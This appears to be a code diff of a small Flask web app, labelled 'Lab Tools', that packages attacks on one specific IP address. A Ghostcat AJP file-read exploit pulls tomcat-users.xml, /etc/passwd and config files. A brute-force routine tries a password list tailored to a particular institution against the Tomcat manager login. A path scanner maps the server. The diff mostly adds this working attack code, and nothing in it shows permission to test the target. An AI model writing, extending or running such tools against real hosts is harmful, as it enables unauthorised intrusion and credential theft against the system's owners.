@@ -1,5 +1,4 @@
 import socket
-import struct
 from flask import Flask
 
 app = Flask(__name__)
@@ -10,12 +9,15 @@ def ghostcat(host, port=8009):
         "/WEB-INF/web.xml",
         "/WEB-INF/tomcat-users.xml",
         "/etc/passwd",
+        "/WEB-INF/conf/opencms.properties"
     ]
+    
     for f in files:
         try:
             s = socket.socket()
             s.settimeout(20)
             s.connect((host, port))
+            
             payload = bytearray([
                 0x12, 0x34, 0x00, 0x1f,
                 0x02, 0x02,
@@ -32,7 +34,9 @@ def ghostcat(host, port=8009):
                 0x1f, 0x90, 0x00,
                 0x00, 0x00, 0xff
             ])
+            
             s.send(bytes(payload))
+            
             response = b""
             try:
                 while True:
@@ -42,23 +46,133 @@ def ghostcat(host, port=8009):
                     response += chunk
             except:
                 pass
+            
             if response:
-                results.append(f"FILE: {f}\n{response.decode(errors='ignore')}")
+                results.append({
+                    "file": f,
+                    "status": "SUCCESS",
+                    "data": response.decode(errors='ignore')
+                })
             else:
-                results.append(f"FILE: {f}\nNo response")
+                results.append({
+                    "file": f,
+                    "status": "NO RESPONSE",
+                    "data": ""
+                })
             s.close()
+            
         except Exception as e:
-            results.append(f"FILE: {f}\nError: {e}")
+            results.append({
+                "file": f,
+                "status": "ERROR",
+                "data": str(e)
+            })
+    
     return results
+
+def bruteforce():
+    target = "http://111.68.102.6:8080/manager/html"
+    import urllib.request
+    import base64
+    
+    users = ["tomcat","admin","manager","root"]
+    passwords = [
+        "tomcat","admin","admin123","password",
+        "s3cret","manager","root","uet","uet123",
+        "rcet","rcet123","lahore","pakistan",
+        "123456","tomcat123","Admin123","changeme",
+        "welcome","letmein","default","catalina",
+        "java123","tomcat9","engineering","uet2024"
+    ]
+    
+    results = []
+    for user in users:
+        for passwd in passwords:
+            creds = f"{user}:{passwd}"
+            b64 = base64.b64encode(creds.encode()).decode()
+            req = urllib.request.Request(target)
+            req.add_header("Authorization", f"Basic {b64}")
+            req.add_header("User-Agent", "Mozilla/5.0")
+            try:
+                res = urllib.request.urlopen(req, timeout=5)
+                if res.status == 200:
+                    return f"FOUND: {user}:{passwd}"
+            except urllib.error.HTTPError as e:
+                if e.code == 401:
+                    results.append(f"Failed: {user}:{passwd}")
+            except Exception as e:
+                results.append(f"Error: {str(e)[:30]}")
+    
+    return "No credentials found"
 
 @app.route('/')
 def index():
-    return "Lab Tools Running!"
+    return """
+    <h1>Lab Tools</h1>
+    <ul>
+        <li><a href='/ghostcat'>Run Ghostcat</a></li>
+        <li><a href='/brute'>Run Bruteforce</a></li>
+        <li><a href='/info'>Server Info</a></li>
+    </ul>
+    """
 
-@app.route('/run')
-def run():
+@app.route('/ghostcat')
+def run_ghostcat():
     results = ghostcat("111.68.102.6")
-    return "<br><br>".join(results)
+    output = "<h1>Ghostcat Results - 111.68.102.6:8009</h1>"
+    for r in results:
+        color = "green" if r['status'] == "SUCCESS" else "red"
+        output += f"""
+        <hr>
+        <h3>File: {r['file']}</h3>
+        <p style='color:{color}'>Status: {r['status']}</p>
+        <pre style='background:#000;color:#0f0;padding:10px'>
+{r['data'] if r['data'] else 'Empty response'}
+        </pre>
+        """
+    return output
+
+@app.route('/brute')
+def run_brute():
+    result = bruteforce()
+    color = "green" if "FOUND" in result else "red"
+    return f"""
+    <h1>Bruteforce Results</h1>
+    <p style='color:{color};font-size:24px'>{result}</p>
+    """
+
+@app.route('/info')
+def server_info():
+    import urllib.request
+    import urllib.error
+    
+    target = "http://111.68.102.6:8080"
+    paths = [
+        "/", "/home", "/opencms/",
+        "/examples/", "/docs/",
+        "/manager/html", "/host-manager/html",
+        "/examples/jsp/snp/snoop.jsp",
+    ]
+    
+    output = "<h1>Server Map - 111.68.102.6:8080</h1>"
+    output += "<table border='1' cellpadding='10'>"
+    output += "<tr><th>Status</th><th>Path</th></tr>"
+    
+    for path in paths:
+        try:
+            req = urllib.request.Request(
+                target + path,
+                headers={"User-Agent": "Mozilla/5.0"}
+            )
+            res = urllib.request.urlopen(req, timeout=5)
+            output += f"<tr style='background:green;color:white'><td>{res.status} OPEN</td><td>{path}</td></tr>"
+        except urllib.error.HTTPError as e:
+            output += f"<tr style='background:orange'><td>{e.code} FOUND</td><td>{path}</td></tr>"
+        except Exception as e:
+            output += f"<tr style='background:red;color:white'><td>ERROR</td><td>{path}</td></tr>"
+    
+    output += "</table>"
+    return output
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=10000)
